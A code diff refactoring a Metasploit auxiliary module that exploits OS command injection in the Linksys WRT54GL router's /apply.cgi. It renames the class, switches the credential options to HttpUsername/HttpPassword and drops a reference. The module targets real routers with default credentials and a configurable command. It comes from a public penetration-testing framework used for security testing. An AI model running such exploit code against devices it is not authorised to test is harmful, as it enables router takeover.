@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -29,29 +26,27 @@ class Metasploit3 < Msf::Auxiliary
       'License'         => MSF_LICENSE,
       'References'      =>
         [
-          [ 'URL', 'http://homesupport.cisco.com/en-eu/support/routers/WRT54GL' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-01' ],
           [ 'URL', 'http://www.s3cur1ty.de/attacking-linksys-wrt54gl' ],
           [ 'EDB', '24202' ],
           [ 'BID', '57459' ],
           [ 'OSVDB', '89421' ]
         ],
-      'DefaultTarget'  => 0,
       'DisclosureDate' => 'Jan 18 2013'))
 
     register_options(
       [
         Opt::RPORT(80),
         OptString.new('TARGETURI',[ true, 'PATH to OS Command Injection', '/apply.cgi']),
-        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
-        OptString.new('PASSWORD',[ false, 'Password to login with', 'password']),
+        OptString.new('HttpUsername',[ true, 'User to login with', 'admin']),
+        OptString.new('HttpPassword',[ false, 'Password to login with', 'password']),
         OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1']),
         OptString.new('NETMASK', [ false, 'LAN Netmask of the router', '255.255.255.0']),
         OptAddress.new('LANIP', [ false, 'LAN IP address of the router (default is RHOST)']),
         OptString.new('ROUTER_NAME', [ false, 'Name of the router', 'cisco']),
         OptString.new('WAN_DOMAIN', [ false, 'WAN Domain Name', 'test']),
         OptString.new('WAN_MTU', [ false, 'WAN MTU', '1500'])
-      ], self.class)
+      ])
   end
 
   # If the user configured LANIP, use it. Otherwise, use RHOST.
@@ -67,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     #setting up some basic variables
     uri = datastore['TARGETURI']
-    user = datastore['USERNAME']
+    user = datastore['HttpUsername']
     rhost = datastore['RHOST']
     netmask = datastore['NETMASK']
     routername = datastore['ROUTER_NAME']
@@ -76,10 +71,10 @@ class Metasploit3 < Msf::Auxiliary
 
     ip = lan_ip.split('.')
 
-    if datastore['PASSWORD'].nil?
+    if datastore['HttpPassword'].nil?
       pass = ""
     else
-      pass = datastore['PASSWORD']
+      pass = datastore['HttpPassword']
     end
 
     print_status("Trying to login with #{user} / #{pass}")
